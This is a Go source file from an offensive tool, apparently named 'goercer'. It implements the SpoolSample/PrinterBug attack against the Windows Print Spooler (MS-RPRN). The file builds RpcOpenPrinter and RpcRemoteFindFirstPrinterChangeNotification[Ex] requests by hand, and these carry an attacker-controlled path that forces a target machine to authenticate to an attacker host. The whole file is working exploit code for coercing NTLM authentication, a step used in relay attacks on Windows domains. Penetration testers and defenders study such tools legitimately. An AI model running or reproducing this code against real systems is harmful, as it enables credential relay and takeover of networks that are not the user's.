package coercer

import (
	"fmt"

	"goercer/internal/config"
	"goercer/internal/dcerpc"
	"goercer/internal/ntlm"
	"goercer/internal/smbxport"
)

func init() {
	Register("spoolsample", func() Coercer { return &SpoolSample{} })
}

// SpoolSample coerces authentication through the MS-RPRN (Print Spooler)
// service. It first opens a printer handle, then invokes the remote-notify
// calls with an attacker-controlled path.
type SpoolSample struct{}

// Name implements Coercer.
func (SpoolSample) Name() string { return "spoolsample" }

// Description implements Coercer.
func (SpoolSample) Description() string { return "SpoolSample / PrinterBug (MS-RPRN)" }

const (
	spoolPipe  = "spoolss"
	spoolUUID  = "12345678-1234-abcd-ef00-0123456789ab"
	spoolMajor = 1
	spoolMinor = 0

	opnumOpenPrinter = 1
	opnumNotify62    = 62
	opnumNotify65    = 65
)

var spoolOpnumNames = map[uint16]string{
	opnumOpenPrinter: "RpcOpenPrinter",
	opnumNotify62:    "RpcRemoteFindFirstPrinterChangeNotification",
	opnumNotify65:    "RpcRemoteFindFirstPrinterChangeNotificationEx",
}

func spoolOpnumName(op uint16) string {
	if n, ok := spoolOpnumNames[op]; ok {
		return n
	}
	return "Unknown"
}

// Execute implements Coercer.
func (s SpoolSample) Execute(sess *smbxport.Session, cfg *config.Config, out *Out) (*Result, error) {
	bound, err := Bind(sess, cfg, out, spoolPipe, spoolUUID, spoolMajor, spoolMinor)
	if err != nil {
		return nil, err
	}
	defer bound.Close()

	// Step 1: open a printer handle on the target to use with notify calls.
	printerName := "\\\\" + cfg.TargetIP + "\x00"
	out.Info("[-] Opening printer handle on \\\\%s", cfg.TargetIP)
	handle, err := s.openPrinter(bound, printerName, out)
	if err != nil {
		return nil, err
	}
	out.Debug("Printer handle: %x", handle)

	opnums := s.selectOpnums(cfg)
	attempted := make([]uint16, len(opnums))
	copy(attempted, opnums)

	paths := Paths(cfg)
	fire := func(op uint16, path string) (bool, error) {
		stub := s.notifyStub(op, path, handle)
		err := dcerpc.Transaction(bound.Pipe, bound.Auth, op, stub)
		if dcerpc.IsCoercionSuccess(err) {
			return true, err
		}
		if err == nil {
			return true, err
		}
		return false, err
	}

	successful, lastErr := runOpnums(cfg, paths, out, opnums, spoolOpnumName, fire)
	res := newResult(cfg, successful, attempted, lastErr)
	if successful >= 0 {
		out.Info("[+] Coercion triggered via opnum %d", successful)
	} else if lastErr != nil {
		out.Info("[!] No opnum succeeded; last error: %v", lastErr)
	}
	return res, lastErr
}

// openPrinter calls RpcOpenPrinter (opnum 1) and parses the returned 20-byte
// context handle from the response stub.
func (SpoolSample) openPrinter(bound *BoundPipe, printerName string, out *Out) ([]byte, error) {
	stub := rpcOpenPrinterStub(printerName)
	resp, err := dcerpc.TransactWithResponse(bound.Pipe, bound.Auth, opnumOpenPrinter, stub)
	if err != nil {
		return nil, err
	}
	if len(resp) < 20 {
		return nil, fmt.Errorf("RpcOpenPrinter response too short: got %d, want 20", len(resp))
	}
	return resp[:20], nil
}

func (SpoolSample) selectOpnums(cfg *config.Config) []uint16 {
	if cfg.Opnum >= 0 {
		return []uint16{uint16(cfg.Opnum)}
	}
	return []uint16{opnumNotify65, opnumNotify62}
}

// notifyStub builds the RpcRemoteFindFirstPrinterChangeNotification[Ex] body:
// context handle, flags, and the attacker-controlled local-machine path.
func (SpoolSample) notifyStub(op uint16, path string, handle []byte) []byte {
	utf16 := ntlm.UTF16LE(path)
	length := uint32(len([]rune(path)))

	buf := append([]byte{}, handle...)        // 20-byte context handle
	buf = append(buf, 0x00, 0x01, 0x00, 0x00) // fdwFlags: PRINTER_CHANGE_ADD_JOB
	buf = append(buf, 0, 0, 0, 0)             // fdwOptions
	buf = append(buf, 0x00, 0x00, 0x02, 0x00) // Unique pointer referent
	buf = append(buf, writeU32(length)...)    // Max count
	buf = append(buf, writeU32(0)...)         // Offset
	buf = append(buf, writeU32(length)...)    // Actual count
	buf = append(buf, utf16...)
	for (len(buf) % 4) != 0 {
		buf = append(buf, 0x00)
	}
	buf = append(buf, 0, 0, 0, 0) // dwPrinterLocal

	if op == opnumNotify65 {
		buf = append(buf, 0, 0, 0, 0) // pOptions (NULL)
	} else {
		buf = append(buf, 0, 0, 0, 0) // cbBuffer (0)
		buf = append(buf, 0, 0, 0, 0) // pBuffer (NULL)
	}
	return buf
}

// rpcOpenPrinterStub builds the RpcOpenPrinter (opnum 1) request: a STRING
// handle (referent + conformant string), NULL datatype/devmode, MAXIMUM_ALLOWED.
func rpcOpenPrinterStub(printerName string) []byte {
	utf16 := ntlm.UTF16LE(printerName)
	length := uint32(len([]rune(printerName)))

	buf := []byte{0x00, 0x00, 0x02, 0x00}  // Referent ID (unique pointer)
	buf = append(buf, writeU32(length)...) // Max count
	buf = append(buf, writeU32(0)...)      // Offset
	buf = append(buf, writeU32(length)...) // Actual count
	buf = append(buf, utf16...)
	for (len(buf) % 4) != 0 {
		buf = append(buf, 0x00)
	}
	buf = append(buf, 0, 0, 0, 0)             // pDatatype (NULL)
	buf = append(buf, 0, 0, 0, 0)             // pDevModeContainer.cbBuf
	buf = append(buf, 0, 0, 0, 0)             // pDevModeContainer.pDevMode (NULL)
	buf = append(buf, 0x00, 0x00, 0x00, 0x20) // AccessRequired: MAXIMUM_ALLOWED
	return buf
}
